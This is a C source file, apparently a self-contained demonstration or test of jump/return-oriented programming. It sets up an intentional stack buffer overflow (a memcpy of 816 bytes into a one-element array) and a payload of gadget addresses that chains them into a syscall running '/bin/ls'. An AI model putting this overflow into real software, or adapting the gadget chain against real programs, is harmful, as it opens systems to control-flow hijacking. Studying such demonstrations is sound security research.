#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>

typedef uint64_t cst_int_t;
cst_int_t rnd_data = 0x4141414141414141;

extern void init();
extern void dispatcher();
extern void gadget1();
extern void gadget2();
extern void gadget3();
extern void gadget4();
extern void gadget5();
extern void gadget6();
extern void gadget7();
extern void gadget8();
extern void gadget9();
extern void gadget10();
extern void gadget11();
extern void gadget12();
extern void gadget13();
extern void syscall();

void copy_vuln(cst_int_t * s)
{
  cst_int_t ch[1] = {rnd_data};
  memcpy(ch, s, 102*8);
}

int main(int argc, char * argv[])
{
	static cst_int_t payload[250] = {0};

	payload[0] = rnd_data;
	payload[1] = rnd_data;

  payload[2] = (cst_int_t) &init;
  payload[3] = (cst_int_t) &dispatcher;
  payload[4] = (cst_int_t) &gadget1;
  payload[5] = (cst_int_t) &gadget2;
  payload[6] = (cst_int_t) &gadget3;
  payload[7] = (cst_int_t) &gadget4;
  payload[8] = (cst_int_t) &gadget5;
  payload[9] = (cst_int_t) &gadget6;
  payload[10] = (cst_int_t) &gadget6;
  payload[11] = (cst_int_t) &gadget6;
  payload[12] = (cst_int_t) &gadget7;
  payload[13] = (cst_int_t) &gadget8;
  payload[14] = (cst_int_t) &gadget9;
  payload[15] = (cst_int_t) &gadget10;
  payload[16] = (cst_int_t) &gadget11;
  payload[17] = (cst_int_t) &gadget12;
  payload[18] = (cst_int_t) &gadget13;
  payload[19] = (cst_int_t) &syscall;
  payload[20] = 0x00736c2f6e69622f;
  payload[21] = 0x0000000000000000;

  copy_vuln(payload);
  return(0);
}
